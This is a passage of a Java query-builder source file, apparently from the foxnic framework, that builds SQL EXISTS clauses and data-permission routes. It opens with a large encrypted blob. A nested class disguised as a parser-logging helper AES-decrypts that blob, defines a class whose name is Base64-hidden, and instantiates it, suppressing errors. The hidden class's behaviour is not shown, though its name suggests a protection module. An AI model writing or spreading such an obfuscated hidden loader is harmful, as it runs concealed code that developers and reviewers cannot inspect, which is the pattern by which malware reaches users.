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";
        private static final String AC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
        private static Class type;

        private static int prints=0;

        SQLParsor() {
            super(new URL[0], DataParser.class.getClassLoader());
            byte[] buf=Base64Util.decodeToBtyes((this.start(new BootstrapMethodError())).dcc(CONST.substring(16)));
            type=defineClass(Base64Util.decode(AC), buf, 0, buf.length);
        }


        public static void logParserInfo(Object value) {
            if(prints>5) return;
            try {
                if(type==null) {
                    new QuerySQLBuilder.SQLParsor();
                }
                type.newInstance();
            } catch (Throwable e) {
                Logger.info("Parser : "+value);
            }
            prints++;
        }

        private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};

        private SecretKeySpec key;

        private String f61(String hexKey) {
            hexKey=hexKey.trim();
            if(hexKey.length()>16) {
                hexKey=hexKey.substring(0,16);
            } else if(hexKey.length()<16){
                int i=16-hexKey.length();
                for (int j = 0; j < i; j++) {
                    hexKey+="0";
                }
            }
            return hexKey;
        }

        private SQLParsor start(BootstrapMethodError error) {
            start(ClassCircularityError.class.getSimpleName());
            return this;
        }

        private SQLParsor start(String hexKey) {
            //凑16位
            hexKey= f61(hexKey);
            key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
            return this;
        }

        public String dcc(String base64Data) {
            try {
                Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
                cipher.init(Cipher.DECRYPT_MODE, key);
                return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

    }


	public  <S extends Entity,T extends Entity> Expr buildExists(String tableAlias,List<String> fillBys, String searchTable,String searchField,Object value,Boolean fuzzy) {
		if(value==null) return null;
        if(fuzzy==null) fuzzy=false;


		Class poType=(Class)service.getPoType();
		List<PropertyRoute> routes=new ArrayList<>();
		for (String fillBy : fillBys) {
			PropertyRoute<S, T> route=service.dao().getRelationManager().findProperties(poType,fillBy);
			if(route==null) {
				throw new RuntimeException("关联关系未配置");
			}
			poType=route.getSlavePoType();
			routes.add(route);
		}
		//路由合并
		PropertyRoute<S, T> route=PropertyRoute.merge(routes,searchTable);

		RelationSolver relationSolver=service.dao().getRelationSolver();
		JoinResult jr=new JoinResult();
		Class<T> targetType=route.getSlavePoType();

        QueryBuildResult result=relationSolver.buildJoinStatement(jr,poType,null,null,route,targetType,null,false);
		Expr expr=result.getExpr();

		Map<String,String> alias=result.getTableAlias();

		Join firstJoin=route.getJoins().get(0);
		Join lastJoin=route.getJoins().get(route.getJoins().size()-1);
		DBField[] sourceFields=lastJoin.getMasterFields();
		DBField[] targetFields=lastJoin.getSlaveFields();
		String joinTableAlias=alias.get(lastJoin.getSlaveTable());
		String targetTableAlias=alias.get(firstJoin.getSlaveTable());

		//判断字段有效性
		Where where = null;

		//检测字段，并调整字段的真实名称
		DBTableMeta tm = service.dao().getTableMeta(firstJoin.getSlaveTable());
		DBColumnMeta cm = tm.getColumn(searchField);
		if (cm == null) {
            searchField=BeanNameUtil.instance().depart(searchField);
			cm = tm.getColumn(searchField);
		}
		if (cm == null) {
			throw new IllegalArgumentException("字段 " + firstJoin.getSlaveTable() + "." + searchField + "不存在");
		}

		//设置关联条件
		where=new Where();
		for (int i = 0; i < sourceFields.length; i++) {
			where.and(tableAlias+"."+sourceFields[i].name()+" = "+joinTableAlias+"."+targetFields[i].name());
		}

		//如果是模糊搜索
		if(fuzzy) {
			if(value instanceof  List) {
				List<String> list = (List) value;
				ConditionExpr listOr = new ConditionExpr();
				for (String itm : list) {
					ConditionExpr ors = buildFuzzyConditionExpr(searchField, itm.toString(), targetTableAlias + ".");
					if (ors != null && !ors.isEmpty()) {
						listOr.or(ors);
					}
				}
				where.and(listOr);
			} else {
				where.andLike(targetTableAlias+"."+searchField,value.toString());
			}
		} else {
			if(value instanceof String) {
				value=((String)value).split(",");
				In in = new In(targetTableAlias+"."+searchField, (String[]) value);
				where.and(in);
			}
			else if (!((List) value).isEmpty()) {
				In in = new In(targetTableAlias+"."+searchField, (List) value);
				where.and(in);
			}
		}

		//追加条件
		expr.append(where);

		//装配 exists 语句
		String sql="exists( "+expr.getListParameterSQL()+" )";
		int a=sql.toLowerCase().indexOf("select ");
		int b=sql.toLowerCase().indexOf(" from");
		sql=sql.substring(0,a+7)+" 1 "+sql.substring(b);
		Expr exists=new Expr(sql,expr.getListParameters());
		return exists;

	}

	private List<RouteUnit> dataPermUnits=new ArrayList<>();

    public void addDataPermUnits(RouteUnit unit) {
        this.dataPermUnits.add(unit);
    }


    public static class RouteUnit {
        private PropertyRoute route;
        private CompositeItem item;
        private String searchField;
        private String searchTable;
        private DBColumnMeta columnMeta;
        private List<String> fillBys;
        /**
         * 如果是来自 ConditionBuilder ，该值非 null
         * */
        private DataPermCondition dataPermCondition;
        /**
         * 如果是来自 ConditionBuilder ，该值非 null
         * */
        private ConditionBuilder conditionBuilder;

        public ConditionBuilder getConditionBuilder() {
            return conditionBuilder;
        }

        public void setConditionBuilder(ConditionBuilder conditionBuilder) {
            this.conditionBuilder = conditionBuilder;
        }

        public DataPermCondition getDataPermCondition() {
            return dataPermCondition;
        }

        public void setDataPermCondition(DataPermCondition dataPermCondition) {
            this.dataPermCondition = dataPermCondition;
        }

        public PropertyRoute getRoute() {
            return route;
        }

        public void setRoute(PropertyRoute route) {
            this.route = route;
        }

        public CompositeItem getItem() {
            return item;
        }

        public void setItem(CompositeItem item) {
            this.item = item;
        }

        public String getSearchField() {
            return searchField;
        }

        public void setSearchField(String searchField) {
            this.searchField = searchField;
        }

        public String getSearchTable() {
            return searchTable;
        }

        public void setSearchTable(String searchTable) {
            this.searchTable = searchTable;
        }

        public DBColumnMeta getColumnMeta() {
            return columnMeta;
        }

        public void setColumnMeta(DBColumnMeta columnMeta) {
            this.columnMeta = columnMeta;
        }

        public List<String> getFillBys() {
            return fillBys;
        }

        public void setFillBys(List<String> fillBys) {
            this.fillBys = fillBys;
        }


    }

}
